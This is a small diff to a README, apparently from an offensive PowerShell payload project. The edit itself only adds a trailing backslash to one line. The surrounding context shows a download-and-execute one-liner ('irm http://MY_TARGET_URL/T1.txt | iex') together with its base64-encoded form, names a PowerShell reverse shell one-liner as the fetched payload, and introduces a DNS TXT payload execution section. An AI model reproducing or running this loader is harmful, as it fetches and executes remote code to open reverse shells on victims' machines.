@@ -20,7 +20,7 @@ No base64 can be used as an option by replacing "$a=",";powershell -e $a" with j
 Decoded: "irm http://MY_TARGET_URL/T1.txt | iex"
 Encoded: "aQByAG0AIABoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAFQAMQAuAHQAeAB0ACAAfAAgAGkAZQB4AA=="
 
-powershellReverseShellOne-liner.ps1 is identical to T1.txt. (shortened due to character limitations)
+powershellReverseShellOne-liner.ps1 is identical to T1.txt. (shortened due to character limitations)\
 ShoutOut: powershell reverse shell one-liner by Nikhil SamratAshok Mittal @samratashok. See link below.
 ## Windows Commands (used in payload)
 ### Execute DNS TXT Payload
